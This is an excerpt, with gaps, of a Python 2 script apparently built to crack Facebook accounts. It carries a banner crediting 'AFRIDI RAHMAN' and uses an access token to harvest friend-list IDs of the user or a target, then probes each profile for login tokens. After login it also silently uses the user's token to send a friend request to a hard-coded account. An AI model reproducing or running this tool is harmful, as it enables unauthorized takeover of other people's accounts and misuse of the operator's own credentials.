...
♨️°───────(RAHMAN)───────°♨️
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ AFRIDI RAHMAN       ║    
\033[1;98m║✯ AFRIDI RAHMAN           ║  
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://mbasic.facebook.com/restserver.php"
				...
				requests.post('https://web.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def menu():
	...
	try:
		...
		login()
	try:
		otw = requests.get('https://web.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://web.facebook.com/me/subscribers?access_token=' + toket)
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mAFRIDI-RAHMAN\033[1;97m═══•◈•"
		jalan('\033[1;91mGetting IDs \033[1;91m...')
		r = requests.get("https://web.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mAFRIDI RAHMAN\033[1;95m◈•══════•◈•"
		try:
			jok = requests.get("https://web.facebook.com/"+idt+"?access_token="+toket)
		...
		r = requests.get("https://web.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
	...
	def main(arg):
		...
		try:
			...
			pass #Dev:rana
		try:
			a = requests.get('https://web.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			...
			if 'access_token' in q:
				x = requests.get("https://web.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
